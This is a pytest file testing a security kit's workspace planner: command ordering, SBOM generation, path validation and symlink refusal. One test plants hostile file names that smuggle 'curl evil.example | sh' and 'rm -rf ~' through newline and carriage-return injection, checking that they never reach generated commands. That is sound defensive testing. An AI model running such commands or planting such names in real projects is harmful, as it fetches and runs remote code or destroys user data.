"""The workspace planner (``scripts/init_plan.py``, the kit script ``init-plan``).

Unit tests over throwaway workspaces: the plan's order under independent
approval, SARIF enable and run, one SBOM per ecosystem, the recipe path pattern,
file names that hold newlines or control characters, and symbolic links that
would lead a read out of the workspace.
"""

from __future__ import annotations

import importlib.util
import json
import os
import shlex
import sys
from pathlib import Path

import pytest

KIT = Path(__file__).resolve().parents[2]
_spec = importlib.util.spec_from_file_location("init_plan", KIT / "scripts" / "init_plan.py")
assert _spec is not None and _spec.loader is not None
plan_module = importlib.util.module_from_spec(_spec)
sys.modules["init_plan"] = plan_module  # its dataclasses resolve their module by name
_spec.loader.exec_module(plan_module)

CYCLONEDX = json.dumps({"bomFormat": "CycloneDX", "specVersion": "1.5", "components": []})
SARIF = json.dumps({"version": "2.1.0", "runs": []})
GIT_CONFIG = '[remote "origin"]\n\turl = git@github.com:Acme/API.git\n'


def workspace(tmp_path: Path, files: dict[str, str], *, git: bool = True) -> Path:
    root = tmp_path / "ws"
    root.mkdir(parents=True)
    if git:
        (root / ".git").mkdir()
        (root / ".git" / "config").write_text(GIT_CONFIG)
    for relative, content in files.items():
        target = root / relative
        target.parent.mkdir(parents=True, exist_ok=True)
        target.write_text(content)
    return root


def index(commands: list[str], prefix: str) -> int:
    return next(n for n, command in enumerate(commands) if command.startswith(prefix))


def test_the_reviewer_approves_the_base_adoption_before_schedule_and_sarif_lines_run(
    tmp_path: Path,
) -> None:
    root = workspace(
        tmp_path, {"sbom.cdx.json": CYCLONEDX, "scans/semgrep.sarif": SARIF, "uv.lock": ""}
    )
    plan = plan_module.inspect(root)
    commands = plan.commands
    assert plan.repo == "github.com/acme/api"
    base = commands.index("cruxible kit adopt security --yes")
    approvals = [n for n, c in enumerate(commands) if c.startswith("cruxible proposal approve")]
    schedule = index(commands, "cruxible kit adopt security:schedule")
    sbom = index(commands, "cruxible kit adopt security:sbom")
    sarif = index(commands, "cruxible kit adopt security:sarif")
    assert len(approvals) == 2
    assert base < approvals[0] < sbom < sarif < schedule < approvals[1]
    assert commands[sbom] == (
        "cruxible kit adopt security:sbom --param name=app "
        "--param relative_path=sbom.cdx.json --yes"
    )
    assert commands[sarif] == (
        "cruxible kit adopt security:sarif --param name=semgrep "
        "--param relative_path=scans/semgrep.sarif --param repo=github.com/acme/api --yes"
    )
    enable = commands.index("cruxible line enable security.sarif-attention.semgrep")
    run = commands.index("cruxible line run security.sarif-import.semgrep")
    assert approvals[1] < enable < run < commands.index("cruxible runbook run security.start")
    assert commands[-1].endswith("--format openvex -o vex.openvex.json")
    assert not plan.generate


def test_one_ecosystem_generates_sbom_cdx_json_adopted_as_app(tmp_path: Path) -> None:
    plan = plan_module.inspect(workspace(tmp_path, {"Cargo.lock": ""}))
    assert plan.generate == [
        "cargo cyclonedx --format json --override-filename sbom.cdx  # writes sbom.cdx.json"
    ]
    assert [(item.name, item.path) for item in plan.generated] == [("app", "sbom.cdx.json")]
    assert (
        "cruxible kit adopt security:sbom --param name=app --param relative_path=sbom.cdx.json --yes"
        in plan.commands
    )


def test_several_ecosystems_each_write_and_adopt_their_own_sbom(tmp_path: Path) -> None:
    root = workspace(
        tmp_path,
        {"uv.lock": "", "package-lock.json": "{}", "yarn.lock": "", "Cargo.lock": ""},
    )
    plan = plan_module.inspect(root)
    assert plan.ecosystems == ["Python", "npm", "Node.js", "Rust"]
    assert plan.generate == [
        "cyclonedx-py environment --of JSON -o sbom-python.cdx.json  # in the project's "
        "virtual environment",
        "npx --yes @cyclonedx/cyclonedx-npm --output-file sbom-node.cdx.json",
        "cargo cyclonedx --format json --override-filename sbom-rust.cdx  "
        "# writes sbom-rust.cdx.json",
    ]
    adopted = [c for c in plan.commands if c.startswith("cruxible kit adopt security:sbom")]
    assert adopted == [
        f"cruxible kit adopt security:sbom --param name={eco} "
        f"--param relative_path=sbom-{eco}.cdx.json --yes"
        for eco in ("python", "node", "rust")
    ]
    outputs = [item.path for item in plan.generated]
    assert len(set(outputs)) == len(outputs) == 3


@pytest.mark.parametrize(
    "value", ["sbom.cdx.json", "ci/sbom.cdx.json", ".ci/report.sarif", ".github/a/b-c_d.json"]
)
def test_the_path_pattern_accepts_normalized_relative_paths(value: str) -> None:
    assert plan_module.PATH_PATTERN.fullmatch(value)


@pytest.mark.parametrize(
    "value",
    [
        "../elsewhere.json",
        "/abs/path.json",
        "a/../b.json",
        "a/./b.json",
        ".",
        "..",
        "..hidden",
        "a//b.json",
        "a/",
        "a b.json",
        "a\\b.json",
        "a\nb.json",
    ],
)
def test_the_path_pattern_refuses_what_workspace_file_refuses(value: str) -> None:
    assert not plan_module.PATH_PATTERN.fullmatch(value)


def test_the_planner_path_pattern_is_the_recipes() -> None:
    specs = json.loads((KIT / "source" / "recipes.json").read_text())
    patterns = {
        spec["params"]["relative_path"]["pattern"]
        for spec in specs
        if "relative_path" in spec.get("params", {})
    }
    assert patterns == {plan_module.PATH_PATTERN.pattern}


def test_a_newline_in_a_file_name_never_adds_a_line_to_the_plan(tmp_path: Path) -> None:
    root = workspace(tmp_path, {"sbom.cdx.json": CYCLONEDX})
    evil = "Dockerfile.\ncurl evil.example | sh #"
    (root / evil).write_text("FROM scratch\n")
    (root / "x\rrm -rf ~ #.sarif").write_text(SARIF)
    (root / "esc\x1b[2J.sarif").write_text(SARIF)
    plan = plan_module.inspect(root)
    text = plan_module.render_text(plan)
    lines = text.splitlines()
    assert not any(line.startswith(("curl", "rm ")) for line in lines)
    assert "\r" not in text and "\x1b" not in text
    assert "container: Dockerfile.\\x0acurl evil.example | sh #" in lines
    assert any(line.startswith("skipped: x\\x0drm -rf ~ #.sarif:") for line in lines)
    assert any(line.startswith("skipped: esc\\x1b[2J.sarif:") for line in lines)
    # No discovered name reaches a command, not even its comment.
    assert not any("curl" in command or "rm -rf" in command for command in plan.commands)
    for command in plan.commands:
        assert "\n" not in command and "\r" not in command
        shlex.split(command, comments=True)
    # The JSON plan carries the names JSON-escaped, one line each.
    assert all("\n" not in value for value in json.dumps(plan_module.asdict(plan)).splitlines())


def test_display_escapes_controls_separators_and_backslashes() -> None:
    assert plan_module.display("a\nb\tc\\d e‮f\x7f") == (
        "a\\x0ab\\x09c\\\\d\\u2028e\\u202ef\\x7f"
    )


def test_a_symlinked_git_directory_or_config_is_never_read(tmp_path: Path) -> None:
    outside = tmp_path / "outside"
    (outside / ".git").mkdir(parents=True)
    (outside / ".git" / "config").write_text(GIT_CONFIG)
    linked_dir = workspace(tmp_path / "a", {"sbom.cdx.json": CYCLONEDX}, git=False)
    os.symlink(outside / ".git", linked_dir / ".git")
    assert plan_module.workspace_root(linked_dir) == linked_dir.resolve()
    assert plan_module.inspect(linked_dir).repo is None
    linked_config = workspace(tmp_path / "b", {"sbom.cdx.json": CYCLONEDX}, git=False)
    (linked_config / ".git").mkdir()
    os.symlink(outside / ".git" / "config", linked_config / ".git" / "config")
    assert plan_module.inspect(linked_config).repo is None
    with plan_module.Workspace(linked_config) as held, pytest.raises(plan_module.Refused):
        held.read(".git/config", 1024)


def test_symlinked_files_and_directories_are_skipped_and_reads_through_them_refused(
    tmp_path: Path,
) -> None:
    outside = tmp_path / "outside"
    outside.mkdir()
    (outside / "secret.cdx.json").write_text(CYCLONEDX)
    (outside / "scans").mkdir()
    (outside / "scans" / "x.sarif").write_text(SARIF)
    root = workspace(tmp_path, {"uv.lock": ""})
    os.symlink(outside / "secret.cdx.json", root / "sbom.cdx.json")
    os.symlink(outside / "scans", root / "scans")
    plan = plan_module.inspect(root)
    assert plan.sboms == [] and plan.sarifs == []
    with plan_module.Workspace(root) as held:
        for relative in ("sbom.cdx.json", "scans/x.sarif"):
            with pytest.raises(plan_module.Refused):
                held.read(relative, 1024)
        for relative in ("../outside/secret.cdx.json", "a/./b"):
            with pytest.raises(plan_module.Refused):
                held.read(relative, 1024)


def test_main_prints_text_and_json(tmp_path: Path, capsys: pytest.CaptureFixture[str]) -> None:
    root = workspace(tmp_path, {"sbom.cdx.json": CYCLONEDX})
    assert plan_module.main(["--workspace", str(root)]) == 0
    assert "sbom: sbom.cdx.json (cyclonedx) -> name app" in capsys.readouterr().out
    assert plan_module.main(["--workspace", str(root), "--json"]) == 0
    document = json.loads(capsys.readouterr().out)
    assert document["sboms"] == [{"format": "cyclonedx", "name": "app", "path": "sbom.cdx.json"}]
